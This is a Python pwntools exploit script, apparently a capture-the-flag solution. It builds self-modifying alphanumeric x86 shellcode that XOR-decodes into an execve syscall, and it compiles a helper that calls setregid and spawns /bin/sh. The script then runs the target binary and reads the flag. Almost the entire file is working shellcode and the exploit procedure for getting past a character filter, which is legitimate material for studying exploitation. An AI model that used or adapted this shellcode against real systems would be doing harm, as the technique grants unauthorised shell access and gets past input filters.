from pwn import *
import os

DEBUG = False
file = "./stack-ovfl-where-32"

c_code = """
#include <unistd.h>

int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
    return 0;
}
"""

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")


charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
byte_set = [hex(ord(c))[2:] for c in charset]
print(hex(ord('0')), hex(ord('9')))
print(hex(ord('A')), hex(ord('Z')))
print(hex(ord('a')), hex(ord('z')))

def valid_xors(needed):
    xors = []
    for i in range(0, 0xff + 1):
        if all(map(lambda x: chr(x ^ i) in charset , needed)):
            xors.append(hex(i))
    return xors

print("for syscall", valid_xors([0xcd, 0x80]))
print("for push ebp", valid_xors([0x5b]))
print("for high_addr", valid_xors([0xf7, 0xfc, 0xe0]))

target_addr = 0xf7fce000

def do_n(s, n):
    return '\n'.join([s for _ in range(0, n)])

shellcode = asm(f'''
pop    edx # store eax in edx
pop    edx

push   0x31 # zero eax
pop    eax
xor    al, 0x31

dec    eax # gets us ff
dec    eax # get us fe
dec    eax # get us fd
dec    eax # get us fc
dec    eax # get us fb
dec    eax # get us fa

xor [edx + 0x51], al
xor [edx + 0x52], al

push 0x7a
push esp

push 0x31
pop  eax
xor  al, 0x31
push eax
pop  ecx
inc  ecx

{do_n("dec eax", 0x17)} # filler for byte alignment

xor [edx + 0x38], cl

.dc.b 0x5a # ^ 0x1 =  pop ebp

push 0x31
pop  eax
xor  al, 0x31
push eax
push eax
pop  ecx
pop  edx

{do_n("inc ecx", 0xb)} # inc ecx to 0xb
push ecx # swap eax = 0, ecx = 0xb
push eax
pop  ecx
pop  eax

.dc.b 0x37, 0x7a # these ^ fa = int 0x80
''')

dis = disasm(shellcode)
print(dis)
print("ILLEGAL LINES: ")
for line in dis.split('\n'):
    columns = line.split('  ')
    bs = columns[2].strip().split(' ')
    if not all(map(lambda b: b in byte_set, bs)):
        print(line)

with open('shellcode.bin', 'wb') as f:
    f.write(shellcode)

io = process("alphanumeric-shellcode-32", env={"PATH":"$PATH:."})

import re
io.sendlineafter(b'Reading', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
